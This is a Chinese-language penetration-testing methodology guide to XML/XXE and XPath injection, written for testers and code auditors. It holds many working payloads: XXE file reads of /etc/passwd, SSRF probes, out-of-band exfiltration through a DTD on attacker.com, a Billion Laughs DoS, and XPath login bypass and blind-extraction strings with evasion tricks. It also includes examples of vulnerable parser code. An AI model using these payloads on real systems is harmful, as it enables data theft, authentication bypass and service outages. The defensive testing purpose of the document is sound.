# XML/XPath 注入攻击方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 XML 注入和 XPath 注入漏洞的标准化测试与利用流程，帮助识别和利用 XML 解析及 XPath 查询中的注入漏洞。

## 1.2 适用范围
适用于使用 XML 进行数据存储、配置管理或使用 XPath 进行数据查询的 Web 应用、SOAP Web Service、RSS 订阅系统等。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

# 第二部分：核心渗透技术专题

## 专题一：XML 注入攻击

### 2.1.1 技术介绍

XML 注入是指攻击者通过构造恶意 XML 输入，改变 XML 文档结构或执行未授权操作的攻击方式。常见类型包括：
- **XML 结构注入**：改变 XML 文档逻辑
- **XXE（XML 外部实体）注入**：读取服务器文件、SSRF 等
- **XML 实体扩展攻击**：DoS 攻击（Billion Laughs）

### 2.2.1 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **SOAP Web Service** | API 调用、企业集成 | SOAP 消息体 XML 结构可控 |
| **文件上传** | XML 配置文件上传 | 上传恶意 XML 文件 |
| **数据导入** | RSS 订阅、XML 数据导入 | 解析外部 XML 源 |
| **文档处理** | SVG 上传、Office 文档 | 解析包含实体的 XML |
| **单点登录** | SAML 认证 | SAML 断言 XML 注入 |

### 2.3.1 漏洞探测方法

#### 黑盒测试

**初步探测 Payload：**

```xml
# 基础 XML 结构测试
<root><test>payload</test></root>

# XXE 测试
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# 实体扩展测试（DoS）
<!DOCTYPE bomb [<!ENTITY a "1234567890">]>
<root>&a;&a;&a;</root>

# 外部 DTD 测试
<!DOCTYPE foo SYSTEM "http://attacker.com/dtd.dtd">
```

**响应判断：**
- 返回文件内容（如 `/etc/passwd`）
- XML 解析错误信息
- 响应延迟或超时
- 出现 SSRF 相关错误

#### 白盒测试

**代码审计关键词（Java）：**
```java
// 危险配置
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// 未禁用外部实体
// factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

**代码审计关键词（PHP）：**
```php
// 危险代码
$doc = new DOMDocument();
$doc->loadXML($userInput);  // 未禁用实体解析
```

### 2.4.1 漏洞利用方法

#### XXE 文件读取

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### XXE SSRF（内网探测）

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root>&xxe;</root>
```

#### XXE 盲注（带外数据）

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
  %remote;
]>
<root>&xxe;</root>
```

#### Billion Laughs DoS

```xml
<!DOCTYPE bomb [
  <!ENTITY a "1234567890">
  <!ENTITY b "&a;&a;">
  <!ENTITY c "&b;&b;">
  <!ENTITY d "&c;&c;">
  ...
  <!ENTITY k "&j;&j;">
]>
<bomb>&k;</bomb>
```

---

## 专题二：XPath 注入攻击

### 2.1.2 技术介绍

XPath 注入是指攻击者通过构造恶意输入，操纵 XPath 查询逻辑，从而绕过认证或提取 XML 数据的攻击方式。

**XPath 查询示例：**
```xpath
# 正常查询
//user[username='john' and password='secret']

# 注入后查询
//user[username='john' or '1'='1' and password='anything']
```

### 2.2.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **用户认证** | XML 存储的用户数据登录 | 用户名/密码拼接到 XPath |
| **数据查询** | XML 数据库搜索 | 搜索参数直接拼接 |
| **配置管理** | 动态配置查询 | 配置参数可控 |
| **RSS/Atom** | 订阅内容过滤 | 过滤条件注入 |

### 2.3.2 漏洞探测方法

#### 黑盒测试

**初步探测 Payload：**

```
# 基础布尔测试
username=' or '1'='1
password=anything

# 注释测试
username=' or ''='
password=' or 1=1 or ''='

# 数字测试
id=1 or 1=1

# 盲注测试
username=' and substring(//user[1]/username,1,1)='a
```

**响应判断：**
- 认证被绕过
- 返回意外数据
- XPath 错误信息
- 条件响应差异

#### 白盒测试

**代码审计关键词（.NET）：**
```csharp
// 危险代码
XPathNavigator nav = doc.CreateNavigator();
XPathExpression expr = nav.Compile("//user[username='" + user + "']");
```

### 2.4.2 漏洞利用方法

#### 认证绕过

```
# 基础绕过
' or '1'='1

# 或
' or ''='

# 或
admin' or '1'='1'/*
```

#### 数据提取（盲注）

```
# 提取第一个用户名的首字符
' and substring(//user[1]/username,1,1)='a

# 逐字符提取
' and substring(//user[1]/username,1,1)='a
' and substring(//user[1]/username,2,1)='d
...

# 提取密码
' and substring(//user[username='admin']/password,1,1)='5
```

#### 节点枚举

```
# 探测节点存在
' and count(//user) > 0

# 获取节点数量
' and count(//user) = 5

# 枚举属性名
' and //user[1]/@* = 'admin'
```

### 2.5 漏洞利用绕过方法

#### 绕过引号过滤

```
# 使用 concat 函数
' and substring(//user[1]/username,1,1)=concat('a','')

# 使用字符串函数
' and contains(//user[1]/username, 'a')
```

#### 绕过空格过滤

```
# 使用注释代替空格
'or'1'='1

# 使用 tab/换行
'	or	'1'='1
```

#### 编码绕过

```
# URL 编码
%27%20or%20%271%27%3D%271

# HTML 实体
&#39; or &#39;1&#39;=&#39;1
```

---

# 第三部分：附录

## 3.1 XML 注入 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **XXE 文件读取** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 读取 Linux 文件 |
| **XXE 文件读取** | `<!ENTITY xxe SYSTEM "c:/windows/win.ini">` | 读取 Windows 文件 |
| **XXE SSRF** | `<!ENTITY xxe SYSTEM "http://internal/api">` | 内网探测 |
| **XXE 盲注** | `<!ENTITY % remote SYSTEM "http://attacker.com/dtd">` | 带外数据 |
| **DoS** | Billion Laughs 实体链 | 资源耗尽 |

## 3.2 XPath 注入 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **认证绕过** | `' or '1'='1` | 基础绕过 |
| **认证绕过** | `' or ''='` | 空字符串绕过 |
| **认证绕过** | `admin' or '1'='1'/*` | 注释绕过 |
| **盲注** | `' and substring(//user[1]/username,1,1)='a` | 逐字符提取 |
| **盲注** | `' and count(//user) > 0` | 节点计数 |
| **盲注** | `' and contains(//user[1]/username, 'a')` | 包含匹配 |

## 3.3 常用 XPath 函数

| 函数 | 说明 | 示例 |
|-----|------|------|
| `substring()` | 字符串截取 | `substring(//user[1]/username,1,1)` |
| `contains()` | 包含匹配 | `contains(//user[1]/username, 'admin')` |
| `count()` | 节点计数 | `count(//user)` |
| `string-length()` | 字符串长度 | `string-length(//user[1]/username)` |
| `concat()` | 字符串拼接 | `concat('a','b')` |
| `starts-with()` | 开头匹配 | `starts-with(//user[1]/username, 'ad')` |

## 3.4 参考资源

- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [OWASP XPath Injection](https://owasp.org/www-community/attacks/XPath_Injection)
- [PortSwigger - XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
